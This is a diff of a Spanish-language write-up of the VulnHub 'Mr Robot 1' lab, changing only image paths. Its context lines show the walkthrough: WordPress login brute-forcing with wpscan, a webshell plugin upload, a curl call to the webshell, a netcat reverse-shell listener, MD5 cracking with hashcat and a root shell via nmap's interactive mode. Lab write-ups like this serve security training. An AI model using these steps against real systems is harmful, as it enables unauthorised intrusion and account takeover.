@@ -48,7 +48,7 @@ Para seguir investigando procedemos a visitar el sitio web de la máquina.
 
 ## Visitando el sitio web
 
-![alt text](/assets/img/posts/mrrobot1_vulnhub/image.png)
+![alt text](/assets/img/writeups/vulnhub/mrrobot1_vulnhub/image.png)
 
 Tras una animación que simula el inicio de una máquina nos da un mensaje que parece escrito por el protagonista de la serie Elliot.
 
@@ -71,7 +71,7 @@ Luego nos muestra una serie de comandos que nos dejan interactuar con la máquin
 
 - join: Este comando nos muestra lo siguiente: 
 
-![alt text](/assets/img/posts/mrrobot1_vulnhub/image-1.png)
+![alt text](/assets/img/writeups/vulnhub/mrrobot1_vulnhub/image-1.png)
 
 Parece que tendremos que responder un email, si lo introducimos tras unos segundos muestra un mensaje diciendo que "estaremos en contacto".
 
@@ -151,13 +151,13 @@ Vemos cosas interesantes como que se trata de un sitio web de Wordpress y que te
 
 Por ejemplo podemos visitar el archivo `robots.txt` para ver que es un archivo de texto plano que contiene una serie de palabras que nos indican a los bots que deben ignorar nuestro sitio web.
 
-![alt text](/assets/img/posts/mrrobot1_vulnhub/image-2.png)
+![alt text](/assets/img/writeups/vulnhub/mrrobot1_vulnhub/image-2.png)
 
 ### Primera llave
 
 La primera llave se encuentra en ese archhivo `key-1-of-3.txt`.
 
-![alt text](/assets/img/posts/mrrobot1_vulnhub/image-3.png)
+![alt text](/assets/img/writeups/vulnhub/mrrobot1_vulnhub/image-3.png)
 
 El otro archivo que encontramos es fsociety.dic que se trata de un diccionario con 858,160 palabras, lo vamos a guardar por si hiciese falta; `curl http://192.168.100.90/fsocity.dic > fsocity.dic`.
 
@@ -165,36 +165,36 @@ El otro archivo que encontramos es fsociety.dic que se trata de un diccionario c
 
 En el panel de loin wordpress encontramos algo útil para probar y es que nos permite verificar si el usuario es correcto independientemente de la contraseña.
 
-![alt text](/assets/img/posts/mrrobot1_vulnhub/image-4.png)
+![alt text](/assets/img/writeups/vulnhub/mrrobot1_vulnhub/image-4.png)
 
 Sabiendo esto podemos usar el diccionario que hemos encontrado para intentar lograr acceso a la máquina.
 
-![alt text](/assets/img/posts/mrrobot1_vulnhub/image-5.png)
+![alt text](/assets/img/writeups/vulnhub/mrrobot1_vulnhub/image-5.png)
 
 Encontramos varios usuarios, ahora podemos hacer lo mismo para la contraseña ya que si probamos estos usuarios veremos que el mensaje cambia.
 
-![alt text](/assets/img/posts/mrrobot1_vulnhub/image-6.png)
+![alt text](/assets/img/writeups/vulnhub/mrrobot1_vulnhub/image-6.png)
 
 Para hacer fuerza bruta sobre el login vamos a usar una herramienta diseñada concretamente para Worpress llamada `wpscan` ya que hydra nos podría dar falsos positivos.
 
 ```bash
 ❯ wpscan -U XXXXXX -P ./fsocity.dic --url http://192.168.100.90
 ```
-![alt text](/assets/img/posts/mrrobot1_vulnhub/image-15.png)
+![alt text](/assets/img/writeups/vulnhub/mrrobot1_vulnhub/image-15.png)
 
 ## Subiendo plugins maliciosos
 
 Una vez dentro encontramos que somos administradores del wordpress por lo que tenemos acceso a manejar los plugins y modifica o crear nuevos.
 
-![alt text](/assets/img/posts/mrrobot1_vulnhub/image-7.png)
+![alt text](/assets/img/writeups/vulnhub/mrrobot1_vulnhub/image-7.png)
 
 Vamos a agregar un plugin para otener una shell reversa.
 
-![alt text](/assets/img/posts/mrrobot1_vulnhub/image-8.png)
+![alt text](/assets/img/writeups/vulnhub/mrrobot1_vulnhub/image-8.png)
 
 [Shell utilizada](https://github.com/p0dalirius/Wordpress-webshell-plugin)
 
-![alt text](/assets/img/posts/mrrobot1_vulnhub/image-9.png)
+![alt text](/assets/img/writeups/vulnhub/mrrobot1_vulnhub/image-9.png)
 
 Ahora podemos ejecutar comando mediante curl o desde el navegador.
 
@@ -218,16 +218,16 @@ curl -X POST '192.168.100.92/wp-content/plugins/wp_webshell/wp_webshell.php' --d
 nc -nlvp 4444
 ```
 
-![alt text](/assets/img/posts/mrrobot1_vulnhub/image-10.png)
+![alt text](/assets/img/writeups/vulnhub/mrrobot1_vulnhub/image-10.png)
 
 Estabilizamos la shell y la hacemos interactiva.
 
-![alt text](/assets/img/posts/mrrobot1_vulnhub/image-11.png)
+![alt text](/assets/img/writeups/vulnhub/mrrobot1_vulnhub/image-11.png)
 
 El usuario que manejamos no tiene muchos permisos a simple vista pero si echamos un vistazo a los directorios de otros usuarios encontramos que existe uno llamado `robot` que contiene la seguna key y un hash md5. 
 La key no tenemos permiso para leerla pero el hash si por lo que simplemente vamos a crackearlo.
 
-![alt text](/assets/img/posts/mrrobot1_vulnhub/image-12.png)
+![alt text](/assets/img/writeups/vulnhub/mrrobot1_vulnhub/image-12.png)
 
 Copiamos el hash tal cual y lo vamos a crackear con hashcat.
 
@@ -237,13 +237,13 @@ hashcat -m 0 -a 0 --user hash.txt /usr/share/wordlists/rockyou.txt
 
 Indicamos con `--user`que el hash tiene el nombre del usuario antes del propio hash y con `-m 0` que es de tipo MD5.
 
-![alt text](/assets/img/posts/mrrobot1_vulnhub/image-13.png)
+![alt text](/assets/img/writeups/vulnhub/mrrobot1_vulnhub/image-13.png)
 
 Como no diponemos de ssh tendremos que escalar dentro de la shell que ya teníamos.
 
 ### Segunda llave
 
-![alt text](/assets/img/posts/mrrobot1_vulnhub/image-14.png)
+![alt text](/assets/img/writeups/vulnhub/mrrobot1_vulnhub/image-14.png)
 
 ## Escalando privilegios
 
@@ -255,11 +255,11 @@ Aun así podemos buscar que binario tienen activo el SUID que nos puedan ser út
 find / -perm -4000 -type f 2>/dev/null
 ```
 
-![alt text](/assets/img/posts/mrrobot1_vulnhub/image-16.png)
+![alt text](/assets/img/writeups/vulnhub/mrrobot1_vulnhub/image-16.png)
 
 Tras un rato explorando los binario podemos ver que uno de ellos es nmap concretamente la versión 3.81.
 
-![alt text](/assets/img/posts/mrrobot1_vulnhub/image-17.png)
+![alt text](/assets/img/writeups/vulnhub/mrrobot1_vulnhub/image-17.png)
 
 Buscando por internet posibles vulnerabilidades relacionadas encontramos que estas versiones de Nmap contaban un un modo interactivo que nos permite interactuar con la máquina.
 
@@ -273,5 +273,5 @@ nmap --interactive
 !sh
 ```
 
-![alt text](/assets/img/posts/mrrobot1_vulnhub/image-18.png)
+![alt text](/assets/img/writeups/vulnhub/mrrobot1_vulnhub/image-18.png)
 
